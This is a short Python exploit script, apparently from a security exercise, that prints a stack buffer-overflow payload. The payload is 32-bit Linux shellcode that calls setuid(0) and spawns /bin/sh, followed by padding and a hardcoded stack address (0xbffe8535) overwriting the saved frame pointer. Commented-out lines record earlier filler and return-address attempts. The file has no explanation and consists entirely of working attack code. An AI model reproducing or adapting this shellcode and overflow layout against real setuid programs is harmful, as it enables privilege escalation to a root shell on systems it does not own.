import sys
from struct import pack
# sys.stdout.buffer.write(b"asdfasdfasd")
# sys.stdout.buffer.write(setuid)
# sys.stdout.buffer.write(shellcode)

sys.stdout.buffer.write(b"\x31\xdb\x31\xc0\xb0\x17\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80")

for i in range(0, 88):
	sys.stdout.buffer.write(pack("<I", 0x11))


# sys.stdout.buffer.write(b"asdfasdfasdfasdfasdfasdfasdfasdfasdfasdf")
# sys.stdout.buffer.write(b"asdfasdfasdfasdfasdfasdfasdfasdfasdfasdf")
# sys.stdout.buffer.write(b"asdfasdfas")
# sys.stdout.buffer.write(pack("<I", 0xbf11))
# sys.stdout.buffer.write(pack("<I", 0xbffe8535))
# sys.stdout.buffer.write(pack("<I", 0xbffe8535))
# sys.stdout.buffer.write(pack("<I", 0x22222222))

sys.stdout.buffer.write(pack("<I", 0xbffe8535)) # is the ebp
# sys.stdout.buffer.write(pack("<I", 0xbffe8535)) # is the return addr
# sys.stdout.buffer.write(b"asdfasdfasdfasdfasdf")
# sys.stdout.buffer.write(b"asdfasdfasdfasdfasdf")
# sys.stdout.flush()



